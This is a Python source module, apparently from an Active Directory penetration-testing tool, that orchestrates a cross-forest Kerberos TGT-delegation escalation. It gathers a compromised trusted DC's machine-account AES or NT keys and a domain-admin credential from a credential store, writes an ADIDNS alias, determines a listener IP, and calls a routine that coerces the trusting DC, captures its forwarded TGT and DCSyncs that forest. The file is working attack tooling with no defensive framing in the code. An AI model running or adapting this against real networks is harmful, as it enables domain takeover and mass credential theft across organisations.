"""Attack-step wiring for cross-org TGT-delegation escalation (executor seam).

This is the executor-facing half of the cross-forest cross-org TGT-delegation
feature. The modeled ``CrossOrgTgtDelegation`` edge (added by
``attack_graph_core.couple_cross_org_tgt_delegation_edges``) fires here: this
module gathers the runtime parameters from the compromised trusted forest's
state and hands them to the pure consumer ``execute_cross_org_tgt_delegation``.

Split of responsibility (single-responsibility, testable):

* ``services/relay/kerberos_coercion_capture.py`` — the reusable coerce+capture
  primitive (no decode, no forward).
* ``services/cross_forest_tgt_delegation.py`` — the consumer: decode the AP-REQ,
  extract the forwarded TGT, DCSync the trusting forest. Takes explicit params.
* THIS module — the executor seam: resolve those params from ``shell`` state
  (DC IPs via the DC-inventory SSOT, the trusted DC's machine-account AES keys
  from the credential store, the ADIDNS writer credential, the listener host)
  and call the consumer.

Why the split: the consumer stays a pure, L1-testable orchestration with no
knowledge of ``domains_data`` layout; the param-gathering that DOES know the
workspace layout lives here and is mocked at its boundary in tests. The live
coerce/decode/DCSync is L3 (DarkZero).

Design: docs/superpowers/specs/2026-08-03-kerberos-coercion-capture-module.md
"""

from __future__ import annotations

from typing import Any

from adscan_core.rich_output import print_info, print_warning
from adscan_internal.models.domain import resolve_dc_ip, resolve_dns_server
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.adidns import ADIDNSConfig
from adscan_internal.services.credential_store_service import (
    CredentialStoreService,
    get_stored_domain_credential_for_user,
)
from adscan_internal.services.cross_forest_tgt_delegation import (
    CrossOrgTgtDelegationResult,
    execute_cross_org_tgt_delegation,
)

# Preferred writer principals (in the compromised TRUSTED forest) for the ADIDNS
# A-record bind, most-privileged first. We hold at least one after compromising
# that forest; the resolver falls back to any owned credential.
_WRITER_CANDIDATES = ("Administrator", "administrator")


def _hex_to_bytes(value: str | None) -> bytes | None:
    """Decode a hex key string to bytes, or ``None`` when absent/invalid."""
    candidate = str(value or "").strip()
    if not candidate:
        return None
    try:
        return bytes.fromhex(candidate)
    except ValueError:
        return None


def _trusted_dc_identity(domain_data: dict) -> tuple[str, str] | None:
    """Return ``(short_hostname, machine_account_username)`` for the trusted DC.

    The trusted forest's DC machine account is the SPN whose key we hold (from
    DCSyncing that forest). Its short hostname is the DNS-prefix the coerced
    trusting DC canonicalizes the relay alias to (``cifs/<short>.<trusted>``).
    """
    hostname = str(
        domain_data.get("pdc_hostname_fqdn")
        or domain_data.get("pdc_hostname")
        or domain_data.get("dc_fqdn")
        or ""
    ).strip()
    if not hostname:
        return None
    short = hostname.split(".", 1)[0]
    if not short:
        return None
    return short, f"{short}$"


def _resolve_service_keys(
    shell: Any,
    *,
    service_domain: str,
    machine_username: str,
) -> tuple[list[tuple[int, bytes]] | None, str, str]:
    """Resolve ``(service_keys, service_password, service_nt_hash)`` AES-first.

    Prefers the AES key set we already hold for the trusted DC's machine account
    (from DCSyncing that forest — AES is NOT derivable from the NT hash). Returns
    the pre-computed ``(etype, key)`` pairs when available; otherwise leaves the
    NT hash for the consumer's RC4-only fallback.
    """
    store = CredentialStoreService()
    material = store.get_kerberos_key_material(
        domains_data=getattr(shell, "domains_data", {}),
        domain=service_domain,
        username=machine_username,
    )
    keys: list[tuple[int, bytes]] = []
    nt_hash = ""
    if material is not None:
        aes256 = _hex_to_bytes(material.aes256)
        aes128 = _hex_to_bytes(material.aes128)
        if aes256:
            keys.append((18, aes256))  # AES256-CTS-HMAC-SHA1-96
        if aes128:
            keys.append((17, aes128))  # AES128-CTS-HMAC-SHA1-96
        nt_hash = str(material.nt_hash or "")
        if nt_hash and not keys:
            rc4 = _hex_to_bytes(nt_hash)
            if rc4:
                keys.append((23, rc4))  # RC4-HMAC (last resort — no AES)
    return (keys or None), "", nt_hash


def _resolve_writer_credential(
    shell: Any, *, service_domain: str
) -> tuple[str, str] | None:
    """Return ``(username, secret)`` to bind ADIDNS in the compromised forest.

    We must be able to write an A record in the trusted forest's DNS. After
    compromising that forest we hold a domain-admin credential; pick the most
    privileged available, else any owned principal.
    """
    domains_data = getattr(shell, "domains_data", {})
    for candidate in _WRITER_CANDIDATES:
        secret = get_stored_domain_credential_for_user(
            domains_data, domain=service_domain, username=candidate
        )
        if secret:
            return candidate, secret
    domain_data = domains_data.get(service_domain, {}) or {}
    credentials = domain_data.get("credentials", {})
    if isinstance(credentials, dict):
        for username in credentials:
            secret = get_stored_domain_credential_for_user(
                domains_data, domain=service_domain, username=str(username)
            )
            if secret:
                return str(username), secret
    return None


def _resolve_listener_host(shell: Any, coerce_dc_ip: str) -> str:
    """Our reachable IP the relay alias points at and the listener binds on."""
    candidate = str(getattr(shell, "myip", "") or "").strip()
    if candidate:
        return candidate
    import socket

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect((coerce_dc_ip, 445))
            return str(sock.getsockname()[0])
    except OSError:
        return ""


async def run_cross_org_tgt_delegation_step(
    shell: Any,
    *,
    trusting_domain: str,
    service_domain: str,
    workspace_dir: str,
    capture_timeout: float = 120.0,
) -> CrossOrgTgtDelegationResult:
    """Resolve runtime params and run the cross-org TGT-delegation escalation.

    Args:
        shell: The active PentestShell (source of ``domains_data`` + ``myip``).
        trusting_domain: The forest we escalate INTO (DCSync target).
        service_domain: The compromised TRUSTED forest whose DC machine-account
            key decrypts the AP-REQ and whose DNS we write the alias into.
        workspace_dir: Where the captured ccache is written.
        capture_timeout: Seconds to wait for the coerced authentication.

    Best-effort — never raises; returns the consumer's typed result. The live
    coerce/decode/DCSync is validated at L3 (DarkZero).
    """
    domains_data = getattr(shell, "domains_data", {})
    trusting_data = domains_data.get(trusting_domain, {}) or {}
    trusted_data = domains_data.get(service_domain, {}) or {}

    coerce_dc_ip = resolve_dc_ip(trusting_data) or ""
    trusted_dc_ip = resolve_dc_ip(trusted_data) or ""
    if not coerce_dc_ip:
        return CrossOrgTgtDelegationResult(
            success=False,
            error=f"no DC IP resolved for the trusting forest {trusting_domain}",
        )
    if not trusted_dc_ip:
        return CrossOrgTgtDelegationResult(
            success=False,
            error=f"no DC IP resolved for the compromised forest {service_domain}",
        )

    identity = _trusted_dc_identity(trusted_data)
    if identity is None:
        return CrossOrgTgtDelegationResult(
            success=False,
            error=f"could not resolve the trusted DC hostname for {service_domain}",
        )
    trusted_short, machine_username = identity

    service_keys, service_password, service_nt_hash = _resolve_service_keys(
        shell, service_domain=service_domain, machine_username=machine_username
    )
    if not service_keys and not service_password and not service_nt_hash:
        return CrossOrgTgtDelegationResult(
            success=False,
            error=(
                f"no Kerberos key material held for {machine_username} in "
                f"{service_domain} — DCSync the trusted forest first to obtain the "
                "AES key set for its DC machine account"
            ),
        )

    writer = _resolve_writer_credential(shell, service_domain=service_domain)
    if writer is None:
        return CrossOrgTgtDelegationResult(
            success=False,
            error=(
                f"no writer credential held in {service_domain} to add the ADIDNS "
                "alias record (a domain-admin credential is required)"
            ),
        )
    writer_user, writer_secret = writer

    listener_host = _resolve_listener_host(shell, coerce_dc_ip)
    if not listener_host:
        return CrossOrgTgtDelegationResult(
            success=False, error="could not determine a reachable listener host IP"
        )

    adidns = ADIDNSConfig(
        dc_ip=trusted_dc_ip,
        domain=service_domain,
        username=writer_user,
        password=writer_secret,
        # Split-DC/DNS (issue #15): the trusted forest may serve its AD zone from
        # a separate DNS server; use it for the SOA-serial query. Absent -> DC.
        dns_server=resolve_dns_server(
            getattr(shell, "domains_data", {}).get(service_domain) or {}
        ),
    )
    # The relay alias is prefixed with the trusted DC's short hostname so the
    # coerced trusting DC's Kerberos SPN canonicalization resolves it to the
    # existing ``cifs/<trusted_short>.<service_domain>`` SPN — whose key we hold.
    relay_alias_hostname = trusted_short

    print_info(
        "Cross-org TGT delegation: coercing "
        f"{mark_sensitive(coerce_dc_ip, 'ip')} ({mark_sensitive(trusting_domain, 'domain')}) "
        f"to the alias {mark_sensitive(relay_alias_hostname, 'hostname')} "
        f"(SPN key: {mark_sensitive(machine_username, 'user')}@{mark_sensitive(service_domain, 'domain')})."
    )

    result = await execute_cross_org_tgt_delegation(
        shell,
        trusting_domain=trusting_domain,
        coerce_dc_ip=coerce_dc_ip,
        listener_host=listener_host,
        relay_alias_hostname=relay_alias_hostname,
        service_domain=service_domain,
        service_hostname=trusted_short,
        adidns=adidns,
        workspace_dir=workspace_dir,
        service_keys=service_keys,
        service_password=service_password,
        service_nt_hash=service_nt_hash,
        capture_timeout=capture_timeout,
    )
    if not result.success:
        print_warning(
            f"Cross-org TGT delegation did not complete: {result.error or 'unknown'}."
        )
    return result


__all__ = ["run_cross_org_tgt_delegation_step"]
